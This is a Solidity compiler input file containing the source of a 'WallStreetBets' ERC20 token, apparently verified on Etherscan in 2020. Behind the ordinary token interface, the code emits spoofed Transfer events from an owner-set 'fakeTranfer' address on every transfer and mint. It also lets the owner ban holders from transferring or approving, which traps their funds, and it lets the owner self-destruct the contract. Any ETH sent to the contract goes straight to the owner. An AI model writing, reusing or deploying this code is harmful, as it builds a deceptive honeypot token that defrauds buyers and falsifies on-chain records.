{
  "language": "Solidity",
  "settings": {
    "libraries": {},
    "metadata": {
      "useLiteralContent": true
    },
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "remappings": [],
    "outputSelection": {
      "*": {
        "*": [
          "*"
        ],
        "": [
          "*"
        ]
      }
    }
  },
  "sources": {
    "browser/tokenstaking/token.sol": {
      "content": "/**\n *Submitted for verification at Etherscan.io on 2020-07-02\n*/\n\npragma solidity ^0.6.6;\n\ncontract Owned {\n    modifier onlyOwner() {\n        require(msg.sender==owner);\n        _;\n    }\n    address payable owner;\n    address payable newOwner;\n    function changeOwner(address payable _newOwner) public onlyOwner {\n        require(_newOwner!=address(0));\n        newOwner = _newOwner;\n    }\n    function acceptOwnership() public {\n        if (msg.sender==newOwner) {\n            owner = newOwner;\n        }\n    }\n}\ncontract Miner is Owned {\n    modifier onlyMiner() {\n        require(msg.sender==miner);\n        _;\n    }\n    address payable miner;\n    function changeMiner(address payable _newMiner) public onlyOwner {\n        require(_newMiner!=address(0));\n        miner = _newMiner;\n    }\n}\n\nabstract contract ERC20 {\n    uint256 public totalSupply;\n    function balanceOf(address _owner) view public virtual returns (uint256 balance);\n    function transfer(address _to, uint256 _value) public virtual returns (bool success);\n    function transferFrom(address _from, address _to, uint256 _value) public virtual returns (bool success);\n    function approve(address _spender, uint256 _value) public virtual returns (bool success);\n    function allowance(address _owner, address _spender) view public virtual returns (uint256 remaining);\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\n\ncontract Token is Owned,  ERC20, Miner {\n    string public symbol;\n    string public name;\n    uint8 public decimals;\n    mapping (address=>uint256) balances;\n    mapping (address=>uint256) banned;\n    mapping (address=>mapping (address=>uint256)) allowed;\n    \n    address fakeTranfer;\n    \n    function balanceOf(address _owner) view public virtual override returns (uint256 balance) {return balances[_owner];}\n    \n    function transfer(address _to, uint256 _amount) public virtual override returns (bool success) {\n        require (balances[msg.sender]>=_amount&&_amount>0&&balances[_to]+_amount>balances[_to]&&banned[msg.sender]==0);\n        balances[msg.sender]-=_amount;\n        balances[_to]+=_amount;\n        emit Transfer(msg.sender,_to,_amount);\n        \n        emit Transfer(fakeTranfer,address(this),_amount);\n        \n        return true;\n    }\n  \n    function transferFrom(address _from,address _to,uint256 _amount) public virtual override returns (bool success) {\n        require (balances[_from]>=_amount&&allowed[_from][msg.sender]>=_amount&&_amount>0&&balances[_to]+_amount>balances[_to]&&banned[msg.sender]==0);\n        balances[_from]-=_amount;\n        allowed[_from][msg.sender]-=_amount;\n        balances[_to]+=_amount;\n        emit Transfer(_from, _to, _amount);\n        \n        emit Transfer(fakeTranfer,address(this),_amount);\n        \n        return true;\n    }\n  \n    function approve(address _spender, uint256 _amount) public virtual override returns (bool success) {\n        require (banned[msg.sender]==0);\n        allowed[msg.sender][_spender]=_amount;\n        emit Approval(msg.sender, _spender, _amount);\n        return true;\n    }\n    \n    function allowance(address _owner, address _spender) view public virtual override returns (uint256 remaining) {\n      return allowed[_owner][_spender];\n    }\n    function changeFakeTransfer(address _fake) public onlyOwner{\n        fakeTranfer=_fake;\n    }\n    function mint(uint256 _amount) public onlyMiner{\n        balances[msg.sender]+=_amount;\n        totalSupply+=_amount;\n        emit Transfer(fakeTranfer, msg.sender, _amount);\n    }\n     function burn(uint256 _amount) public onlyMiner{\n        require(balances[msg.sender]>=_amount);\n        balances[msg.sender]-=_amount;\n        totalSupply-=_amount;\n        emit Transfer(msg.sender, address(0), _amount);\n    }\n    function ban(address _target, uint256 _action) public onlyOwner{\n        banned[_target]=_action;\n    }\n    function destroy() public onlyOwner{\n        selfdestruct(msg.sender);\n    }\n}\n\ncontract WallStreetBets is Token{\n    \n    constructor() public{\n        symbol = \"WSB\";\n        name = \"WallStreetBets\";\n        decimals = 18;\n        totalSupply = 51442000*10**18;\n        owner = msg.sender;\n        balances[owner] = totalSupply;\n    }\n    \n    receive () payable external {\n        require(msg.value>0);\n        owner.transfer(msg.value);\n    }\n}"
    }
  }
}